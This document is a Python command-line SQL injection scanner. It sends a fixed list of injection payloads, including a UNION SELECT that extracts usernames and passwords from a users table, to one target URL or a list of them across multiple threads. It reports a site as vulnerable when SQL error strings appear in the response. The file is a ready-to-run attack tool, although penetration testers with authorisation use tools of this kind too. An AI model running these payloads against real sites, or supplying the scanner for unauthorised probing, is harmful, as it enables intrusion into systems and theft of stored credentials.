import requests
import logging
import threading
import time
import shutil
import os
from urllib.parse import urljoin
from bs4 import BeautifulSoup
from colorama import Fore, Back, Style, init

# Initialize colorama
init(autoreset=True)

# Setup logging with a custom formatter to include color
class ColorFormatter(logging.Formatter):
    COLORS = {
        logging.DEBUG: Fore.CYAN,
        logging.INFO: Fore.GREEN,
        logging.WARNING: Fore.YELLOW,
        logging.ERROR: Fore.RED,
        logging.CRITICAL: Fore.MAGENTA,
    }
    
    def format(self, record):
        levelname = record.levelname
        message = super().format(record)
        color = self.COLORS.get(record.levelno, Fore.WHITE)
        return f"{color}{message}"

# Set up logging
logger = logging.getLogger()
console_handler = logging.StreamHandler()
formatter = ColorFormatter('%(asctime)s - %(levelname)s - %(message)s')
console_handler.setFormatter(formatter)
logger.addHandler(console_handler)
logger.setLevel(logging.DEBUG)

# Define SQL Injection payloads (you can update these)
payloads = [
    "' OR '1'='1",
    "' OR 'a'='a",
    '" OR "a"="a',
    "' UNION SELECT NULL, NULL --",
    "' AND 1=2 UNION SELECT NULL, username, password FROM users --",
    "1' OR '1'='1' --",
    "1' UNION SELECT NULL, NULL, database() --",
    "' OR 1=1 --",
]

# Define headers to mimic a browser request
headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
}

# Function to get the URL content
def get_url_content(url):
    try:
        response = requests.get(url, headers=headers, timeout=5)
        response.raise_for_status()
        return response.text
    except requests.exceptions.RequestException as e:
        logger.error(f"Request failed for {url}: {e}")
        return None

# Function to check for SQLi vulnerability in a response
def check_sqli_vulnerability(response_text, url, payload):
    if response_text is None:
        return False
    
    # Check if SQL errors or unusual behavior occurs
    if "syntax error" in response_text.lower() or "mysql_fetch" in response_text.lower() or "unclosed quotation mark" in response_text.lower():
        logger.warning(f"Potential SQLi found at {url} with payload: {payload}")
        return True
    return False

# Function to perform SQLi testing on a single URL with payloads
def scan_url_for_sqli(url, payload):
    # Create the full URL with payload
    payload_url = urljoin(url, f"?id={payload}")
    logger.info(f"Scanning {payload_url} with payload {payload}...")
    
    # Get the page content
    content = get_url_content(payload_url)
    
    # Check for vulnerabilities
    if check_sqli_vulnerability(content, payload_url, payload):
        logger.info(Fore.GREEN + f"SQLi vulnerability found at {payload_url} with payload {payload}")
        return True
    return False

# Worker thread function to scan multiple payloads
def worker(url, payloads, thread_id):
    for payload in payloads:
        if scan_url_for_sqli(url, payload):
            logger.info(Fore.GREEN + f"SQLi vulnerability confirmed on {url} with payload {payload} (Thread {thread_id})")
            break
        else:
            logger.info(Fore.CYAN + f"No vulnerability found on {url} with payload {payload} (Thread {thread_id})")

# Main function to initiate the scanner
def scan_url(url, num_threads=5):
    # Split payloads into chunks for multi-threading
    chunk_size = len(payloads) // num_threads
    payload_chunks = [payloads[i:i + chunk_size] for i in range(0, len(payloads), chunk_size)]
    
    # Create threads for scanning
    threads = []
    for i, payload_chunk in enumerate(payload_chunks):
        thread = threading.Thread(target=worker, args=(url, payload_chunk, i + 1))
        threads.append(thread)
        thread.start()

    # Wait for all threads to complete
    for thread in threads:
        thread.join()

# Function to handle file-based URL scan
def scan_url_from_file(file_path, num_threads=5):
    if not os.path.exists(file_path):
        logger.error(f"File {file_path} does not exist!")
        return
    with open(file_path, 'r') as f:
        urls = f.readlines()
    
    for url in urls:
        url = url.strip()
        if url:
            scan_url(url, num_threads)

# Command-line usage
def main():
    import argparse
    parser = argparse.ArgumentParser(description="SQL Injection Brute-Force Scanner")
    parser.add_argument('-u', '--url', type=str, help="The target URL to scan", required=False)
    parser.add_argument('-f', '--file', type=str, help="File containing URLs to scan", required=False)
    parser.add_argument('--threads', type=int, default=5, help="Number of threads for multi-threading (default: 5)")
    
    args = parser.parse_args()

    if args.url:
        scan_url(args.url, num_threads=args.threads)
    elif args.file:
        scan_url_from_file(args.file, num_threads=args.threads)
    else:
        logger.error(Fore.RED + "Either a URL (-u) or a file (-f) with URLs is required.")
        exit(1)

if __name__ == "__main__":
    main()
